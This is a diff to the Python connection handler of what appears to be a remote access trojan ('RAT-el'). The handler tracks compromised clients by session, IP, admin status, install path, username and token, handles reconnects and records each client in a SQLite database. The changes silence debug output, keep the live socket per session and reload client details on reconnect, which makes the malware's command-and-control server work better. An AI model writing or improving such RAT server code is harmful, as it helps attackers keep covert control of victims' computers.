@@ -52,7 +52,7 @@ class Handler(threading.Thread):
 
                 #print("---> ",session, ip, port, is_he_alive, is_he_admin, path_rat, usename, token)
 
-                Handler.dict_conn[session] = [session, False, ip, port, is_he_alive, is_he_admin, path_rat, usename, token]
+                Handler.dict_conn[session] = [session, sock, ip, port, is_he_alive, is_he_admin, path_rat, usename, token]
        
                 Handler.number_conn = self.ObjSql.returnLastSession() + 1 #ok
                 #print(Handler.number_conn) ok
@@ -61,7 +61,7 @@ class Handler(threading.Thread):
 
 
         else:
-            print("[?] NOT Value in database.")
+            #print("[?] NOT Value in database.")
             pass
             
 
@@ -142,9 +142,11 @@ The client first sends this information, then the server sends the parameters as
                 printColor("error","Error in sendUltraSafe: {}\n".format(e))
             else:
                 if(confirmation == "confirmation"):
-                    print("IN SENDULTRASAFE CONFIRMATION OK")
+                   # print("IN SENDULTRASAFE CONFIRMATION OK")
+                    pass
                 else:
-                    print("IN SENDULTRASAFE CONFIRMATION NOT OK")
+                   # print("IN SENDULTRASAFE CONFIRMATION NOT OK")
+                    pass
         
         self.conn.settimeout(None)
 
@@ -155,7 +157,8 @@ The client first sends this information, then the server sends the parameters as
         try:
             data = self.conn.recv(4096).decode("utf8","replace")
         except socket.timeout:
-            print("timeout in recvultrasafe")
+            #print("timeout in recvultrasafe")
+            pass
         except Exception as e:
             printColor("error", "[-] Error in recvUltraSafe: {} .\n".format(e))
         else:   
@@ -184,26 +187,27 @@ The client first sends this information, then the server sends the parameters as
 
         while True:
             data = self.recvUltraSafe()
-            print(data)
+            #print(data)
             if(data == "\r\n"):
-                print("Stop recvFirstInfo")
+                #print("Stop recvFirstInfo")
                 break
 
             tmp = data.split(SPLIT)
 
             if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
-                print("MOD RECONNECT DETECT")
+                #print("MOD RECONNECT DETECT")
                 token = tmp[1]
-                print("Token recv->", token)
+                #print("Token recv->", token)
                 if bool(Handler.dict_conn): 
                     for value in Handler.dict_conn.values():
                         if(value[NB_TOKEN] == token): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
-                            print("!!!!Token doublon!!!!")
+                            #print("!!!!Token doublon!!!!")
                             already_in_the_dictionary = True
                             nb_session_of_conn = value[NB_SESSION]
 
                 else:
-                    print("dict empty")
+                    #print("dict empty")
+                    pass
             
             elif(tmp[0] == "MOD_HANDSHAKE_IS_ADMIN"):
                 is_admin = tmp[1]
@@ -250,21 +254,19 @@ The client first sends this information, then the server sends the parameters as
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
         
-        print("FINISH handshake")
+        #print("FINISH handshake")
 
 
     def run(self):
 
         self.ObjSql.createDb()
         info = self.recvFirstInfo() #Collect informations with Handshake client. #1
-        
-        print("test in info ->",info)
+          
         #print("test in info ->",len(info))
-        print("test in info ->",type(info))
+
         if(bool(info)):#if not empty
             #print("sencode part persi go !!!! ")
             if type(info) == list:
-                self.sendParameterOfClient()
                 if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
                     self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                     #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
@@ -274,7 +276,7 @@ The client first sends this information, then the server sends the parameters as
                 #print("type of dict_conn ----->",type(Handler.dict_conn))
         
             if type(info) == tuple:#If the customer tries to reconnect: | return Bool
-                print("Reconnect change dict.")
+                #print("Reconnect change dict.")
                 nb_session = info[1]
 
                 #Session number does not change value
@@ -282,12 +284,15 @@ The client first sends this information, then the server sends the parameters as
                 Handler.dict_conn[nb_session][NB_IP] = self.address[0]
                 Handler.dict_conn[nb_session][NB_PORT] =  int(self.address[1])
                 Handler.dict_conn[nb_session][NB_ALIVE] =  True
-                #is admin does not change value
-                #path does not change value
-                #username does not change value
-                #The token does not change value
-
                 
+                #other information does not change:
+                #The information is retrieved from the database to the dictionary:
+                Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(nb_session,"is_he_admin")
+                Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(nb_session,"path_RAT")
+                Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
+                Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
+
+
 
         else:
             #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
